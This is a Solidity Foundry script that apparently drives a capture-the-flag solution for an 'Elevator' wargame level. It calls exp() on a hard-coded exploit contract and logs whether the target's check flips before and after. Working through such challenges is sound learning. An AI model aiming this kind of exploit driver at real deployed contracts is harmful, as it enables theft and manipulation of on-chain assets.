pragma solidity ^0.8.0;

import "forge-std/Script.sol";

contract ElevatorScript is Script {
    function run() external {
        vm.startBroadcast();
        address exp = address(0x6e3E7A8f6adac26Fe4Bf4993F4DF91B0077D2647);
        console.log("before: ");
        (, bytes memory data) = exp.call{value:0}(abi.encodeWithSignature("getChecked()"));
        
        console.log(abi.decode(data, (bool)) ? "YES" : "NO");

        exp.call{value: 0}(abi.encodeWithSignature("exp()"));

        console.log("after: ");
        (, data) = exp.call{value:0}(abi.encodeWithSignature("getChecked()"));
        
        console.log(abi.decode(data, (bool)) ? "YES" : "NO");
    }
}  